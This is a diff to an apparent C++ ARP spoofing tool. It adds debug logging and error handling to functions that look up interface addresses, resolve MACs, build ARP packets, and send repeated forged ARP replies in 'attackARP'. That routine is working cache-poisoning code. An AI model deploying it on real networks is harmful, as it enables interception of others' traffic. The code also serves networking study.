@@ -7,12 +7,21 @@ bool getMyInfo(const std::string& interface, Mac& MAC, Ip& IP) {
     int sockfd;
     struct ifreq ifr = {0, };
 
+#ifdef DEBUG
+    std::cout << "[DEBUG] Successfully get into function 'getMyInfo'\n";
+#endif
+
     // Make socket which domain is IPv4 and type is UDP
     sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
     if(sockfd == -1) {
         std::cerr << CREATE_SOCKET_ERROR_MSG;
         return false;
     }
+
+
+#ifdef DEBUG
+    std::cout << "[DEBUG] Successfully open socket\n";
+#endif
 
     ifr.ifr_addr.sa_family = AF_INET;
 
@@ -25,10 +34,21 @@ bool getMyInfo(const std::string& interface, Mac& MAC, Ip& IP) {
         return false;
     }
 
+#ifdef DEBUG
+    std::cout << "[DEBUG] Successfully process ioctl\n";
+#endif
+
     MAC = (uint8_t *)ifr.ifr_hwaddr.sa_data;
     IP = ((sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr;
 
-    close(sockfd);
+    if(close(sockfd)) {
+        std::cerr << CLOSE_ERROR_MSG;
+        return false;
+    }
+
+#ifdef DEBUG
+    std::cout << "[DEBUG] Successfully close file descriptor\n";
+#endif
 
     return true;
 }
@@ -39,10 +59,18 @@ bool getMACByIP(pcap_t* pcap, Mac& MAC, const Ip& IP, const Mac& myMAC, const Ip
     int res;
 
     struct ArpHdr* ARPHeader;
+
+#ifdef DEBUG
+    std::cout << "[DEBUG] Successfully get into function 'getMACByIP'\n";
+#endif
     
     if(sendPacketARP(pcap, Mac::broadcastMac(), myMAC, myMAC, myIP, Mac::nullMac(), IP, ArpHdr::Request)) {
         return false;
     }
+
+#ifdef DEBUG
+    std::cout << "[DEBUG] Successfully send request packet\n";
+#endif
 
     while( true ) {
         res = pcap_next_ex(pcap, &header, &packet);
@@ -67,6 +95,10 @@ bool getMACByIP(pcap_t* pcap, Mac& MAC, const Ip& IP, const Mac& myMAC, const Ip
            IP            == ARPHeader->sip()) break;
     }
 
+#ifdef DEBUG
+    std::cout << "[DEBUG] Successfully receive reply packet\n";
+#endif
+
     MAC = ARPHeader->smac();
 
     return true;
@@ -81,6 +113,10 @@ bool sendPacketARP(pcap_t* pcap,
                    const Mac& targetMAC, const Ip& targetIP, 
                    ArpHdr::Mode mode) {
     EthArpPacket packet;
+
+#ifdef DEBUG
+    std::cout << "[DEBUG] Successfully get into function 'sendPacketARP'\n";
+#endif
 
     // Set Ethernet header
     packet.eth_.dmac_ = destMAC;
@@ -104,17 +140,30 @@ bool sendPacketARP(pcap_t* pcap,
         return false;
     }
 
+#ifdef DEBUG
+    std::cout << "[DEBUG] Successfully send packet\n";
+#endif
+
     return true;
 }
 
 bool attackARP(pcap_t* pcap, 
                const Mac& sendMAC, const Ip& sendIP, 
                const Mac& myMAC, const Ip& targetIP) {
+
+#ifdef DEBUG
+    std::cout << "[DEBUG] Successfully get into function 'attackARP'\n";
+#endif
+
     for(int i = 0; i < 10; i++) {
         if(not sendPacketARP(pcap, sendMAC, myMAC, myMAC, targetIP, sendMAC, sendIP, ArpHdr::Reply)) {
             return false;
         }
     }
+
+#ifdef DEBUG
+    std::cout << "[DEBUG] Successfully send attack packet\n";
+#endif
 
     return true;
 }
